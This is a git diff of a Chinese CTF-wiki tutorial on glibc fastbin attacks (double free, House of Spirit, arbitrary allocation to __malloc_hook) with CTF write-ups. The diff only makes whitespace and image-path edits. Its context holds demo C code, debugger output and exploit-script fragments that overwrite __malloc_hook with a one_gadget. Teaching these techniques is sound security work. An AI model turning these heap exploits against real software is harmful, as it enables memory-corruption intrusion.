@@ -74,7 +74,7 @@ int main(void)
 Fastbins[idx=2, size=0x30,ptr=0x602080]
 ===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
 ===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
-===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE) 
+===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
 ```
 
 
@@ -108,7 +108,7 @@ int main(void)
     void *chunk1,*chunk2,*chunk3;
     chunk1=malloc(0x10);
     chunk2=malloc(0x10);
-    
+
     free(chunk1);
     free(chunk1);
     return 0;
@@ -129,8 +129,8 @@ int main(void)
 00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
 00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
 02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
-7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 
-7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 
+7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
+7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
 7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
 7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
 7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
@@ -138,13 +138,13 @@ int main(void)
 7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
 7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
 7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
-7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 
+7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
 7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
-7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 
-7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 
+7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
+7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
 7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
 7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
-7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 
+7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
 7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
 7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
 7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
@@ -158,7 +158,7 @@ int main(void)
     void *chunk1,*chunk2,*chunk3;
     chunk1=malloc(0x10);
     chunk2=malloc(0x10);
-    
+
     free(chunk1);
     free(chunk2);
     free(chunk1);
@@ -167,17 +167,17 @@ int main(void)
 ```
 第一次释放`free(chunk1)`
 
-![](/pwn/heap/figure/fastbin_free_chunk1.png)
+![](./figure/fastbin_free_chunk1.png)
 
 第二次释放`free(chunk2)`
 
-![](/pwn/heap/figure/fastbin_free_chunk2.png)
+![](./figure/fastbin_free_chunk2.png)
 
 第三次释放`free(chunk1)`
 
 
 
-![](/pwn/heap/figure/fastbin_free_chunk3.png)
+![](./figure/fastbin_free_chunk3.png)
 
 
 注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。
@@ -189,7 +189,7 @@ typedef struct _chunk
     long long pre_size;
     long long size;
     long long fd;
-    long long bk;  
+    long long bk;
 } CHUNK,*PCHUNK;
 
 CHUNK bss_chunk;
@@ -198,15 +198,15 @@ int main(void)
 {
     void *chunk1,*chunk2,*chunk3;
     void *chunk_a,*chunk_b;
-    
+
     bss_chunk.size=0x21;
     chunk1=malloc(0x10);
     chunk2=malloc(0x10);
-    
+
     free(chunk1);
     free(chunk2);
     free(chunk1);
-    
+
     chunk_a=malloc(0x10);
     *(long long *)chunk_a=&bss_chunk;
     malloc(0x10);
@@ -245,8 +245,8 @@ Start              End                Offset             Perm Path
 00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
 00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
 00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
-7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 
-7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 
+7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
+7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
 7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
 7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
 7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
@@ -254,13 +254,13 @@ Start              End                Offset             Perm Path
 7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
 7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
 7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
-7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 
+7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
 7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
-7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 
-7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 
+7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
+7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
 7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
 7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
-7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 
+7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
 7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
 7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
 7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
@@ -345,13 +345,13 @@ int main()
 运行后的效果如下
 
 ```shell
-➜  how2heap git:(master) ./house_of_spirit 
+➜  how2heap git:(master) ./house_of_spirit
 This file demonstrates the house of spirit attack.
 Calling malloc() once so that it sets up its memory.
 We will now overwrite a pointer to point to a fake 'fastbin' region.
 This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
 This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
-... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
+... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
 The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
 Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
 ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
@@ -380,21 +380,21 @@ typedef struct _chunk
     long long pre_size;
     long long size;
     long long fd;
-    long long bk;  
+    long long bk;
 } CHUNK,*PCHUNK;
 
 int main(void)
 {
     CHUNK stack_chunk;
-    
+
     void *chunk1;
     void *chunk_a;
-    
+
     stack_chunk.size=0x21;
     chunk1=malloc(0x10);
-    
+
     free(chunk1);
-    
+
     *(long long *)chunk1=&stack_chunk;
     malloc(0x10);
     chunk_a=malloc(0x10);
@@ -411,14 +411,14 @@ int main(void)
 ```
 0x7ffff7dd1b20 <main_arena>:	0x0000000000000000 <=== unsorted bin
 0x7ffff7dd1b28 <main_arena+8>:  0x00007fffffffde60 <=== fastbin[0]
-0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	
+0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000
 ```
 最终第二次malloc返回值为0x00007fffffffde70也就是stack_chunk
 ```
    0x400629 <main+83>        call   0x4004c0 <malloc@plt>
  → 0x40062e <main+88>        mov    QWORD PTR [rbp-0x38], rax
    $rax   : 0x00007fffffffde70
-   
+
 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
@@ -427,15 +427,15 @@ int main(void)
 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
-0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
+0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
-0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
-0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
+0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
+0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
-0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
+0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
 
@@ -457,15 +457,15 @@ Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是
 ```
 int main(void)
 {
-    
-    
+
+
     void *chunk1;
     void *chunk_a;
-    
+
     chunk1=malloc(0x60);
-    
+
     free(chunk1);
-    
+
     *(long long *)chunk1=0x7ffff7dd1af5-0x8;
     malloc(0x60);
     chunk_a=malloc(0x60);
@@ -496,13 +496,13 @@ int main(void)
 0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：
 ```
 //这里的size指用户区域，因此要小2倍SIZE_SZ
-Fastbins[idx=0, size=0x10] 
-Fastbins[idx=1, size=0x20] 
-Fastbins[idx=2, size=0x30] 
-Fastbins[idx=3, size=0x40] 
-Fastbins[idx=4, size=0x50] 
-Fastbins[idx=5, size=0x60] 
-Fastbins[idx=6, size=0x70] 
+Fastbins[idx=0, size=0x10]
+Fastbins[idx=1, size=0x20]
+Fastbins[idx=2, size=0x30]
+Fastbins[idx=3, size=0x40]
+Fastbins[idx=4, size=0x50]
+Fastbins[idx=5, size=0x60]
+Fastbins[idx=6, size=0x70]
 ```
 通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f
 ```
@@ -526,9 +526,9 @@ Fastbins[idx=6, size=0x70]
 ```
 0x4005a8 <main+66>        call   0x400450 <malloc@plt>
  →   0x4005ad <main+71>        mov    QWORD PTR [rbp-0x8], rax
- 
- $rax   : 0x7ffff7dd1afd 
- 
+
+ $rax   : 0x7ffff7dd1afd
+
 0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
 0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
 0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
@@ -547,7 +547,7 @@ Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位�
 ```shell
 ➜  2014_Hack.lu_oreo git:(master) file oreo
 oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
-➜  2014_Hack.lu_oreo git:(master) checksec oreo         
+➜  2014_Hack.lu_oreo git:(master) checksec oreo
 [*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo'
     Arch:     i386-32-little
     RELRO:    No RELRO
@@ -695,7 +695,7 @@ if __name__ == "__main__":
 ```shell
 ➜  2015_9447ctf_search-engine git:(master) file search
 search: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
-➜  2015_9447ctf_search-engine git:(master) checksec search   
+➜  2015_9447ctf_search-engine git:(master) checksec search
 [*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -916,7 +916,7 @@ def leak_libc():
 效果如下
 
 ```shell
-pwndbg> fastbins 
+pwndbg> fastbins
 fastbins
 0x20: 0x0
 0x30: 0x1d19320 ◂— 0x0
@@ -932,7 +932,7 @@ fastbins
 此时，fastbin 的链表为 b->a->b->a->…，则我们可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk `0x7fd798586aed`（这里是举一个例子，代码中需使用相对地址）。
 
 ```shell
-pwndbg> print (void*)&main_arena 
+pwndbg> print (void*)&main_arena
 $1 = (void *) 0x7fd798586b20 <main_arena>
 pwndbg> x/8gx 0x7fd798586b20-16
 0x7fd798586b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
@@ -942,11 +942,11 @@ pwndbg> x/8gx 0x7fd798586b20-16
 pwndbg> find_fake_fast 0x7fd798586b10 0x7f
 FAKE CHUNKS
 0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
-  prev_size = 15535264025435701248, 
-  size = 127, 
-  fd = 0xd798247e20000000, 
-  bk = 0xd798247a0000007f, 
-  fd_nextsize = 0x7f, 
+  prev_size = 15535264025435701248,
+  size = 127,
+  fd = 0xd798247e20000000,
+  bk = 0xd798247a0000007f,
+  fd_nextsize = 0x7f,
   bk_nextsize = 0x0
 }
 pwndbg> print /x 0x7fd798586b10-0x7fd798586aed
@@ -1008,9 +1008,9 @@ libc.so.6  search.id0  search.id2  search.til
 ### 基本信息
 
 ```shell
-➜  2017_0ctf_babyheap git:(master) file babyheap                            
+➜  2017_0ctf_babyheap git:(master) file babyheap
 babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
-➜  2017_0ctf_babyheap git:(master) checksec babyheap   
+➜  2017_0ctf_babyheap git:(master) checksec babyheap
 [*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -1178,7 +1178,7 @@ pwndbg> x/20gx 0x55a03ca22000
 0x55a03ca22070:	0x0000000000000000	0x0000000000000000
 0x55a03ca22080:	0x0000000000000000	0x0000000000000091 idx 4
 0x55a03ca22090:	0x0000000000000000	0x0000000000000000
-pwndbg> fastbins 
+pwndbg> fastbins
 fastbins
 0x20: 0x55a03ca22020 —▸ 0x55a03ca22040 ◂— 0x0
 0x30: 0x0
@@ -1212,7 +1212,7 @@ pwndbg> x/20gx 0x55a03ca22000
 0x55a03ca22070:	0x0000000000000000	0x0000000000000000
 0x55a03ca22080:	0x0000000000000000	0x0000000000000091
 0x55a03ca22090:	0x0000000000000000	0x0000000000000000
-pwndbg> fastbins 
+pwndbg> fastbins
 fastbins
 0x20: 0x55a03ca22020 —▸ 0x55a03ca22080 ◂— 0x0
 0x30: 0x0
@@ -1275,7 +1275,7 @@ payload = 0x13 * 'a' + p64(one_gadget_addr)
 fill(6, len(payload), payload)
 # trigger malloc_hook
 allocate(0x100)
-p.interactive() 
+p.interactive()
 ```
 同时，这里的 onegadget 地址也可能需要尝试多次。
 
